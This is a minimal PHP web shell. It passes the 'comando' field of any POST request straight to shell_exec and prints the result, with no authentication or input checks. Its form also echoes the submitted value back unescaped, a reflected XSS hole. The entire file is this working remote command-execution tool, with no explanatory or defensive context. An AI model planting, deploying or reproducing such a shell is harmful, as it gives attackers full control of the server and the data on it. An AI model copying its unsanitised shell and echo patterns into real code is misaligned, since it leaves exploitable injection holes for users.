<?php

$output = shell_exec($_POST['comando']);
echo "<pre>$output</pre>";

?>
<form method="post">
  <textarea id="comando" name="comando"><?=$_POST['comando']?></textarea>
  <input type="submit" value="Submit">
</form>

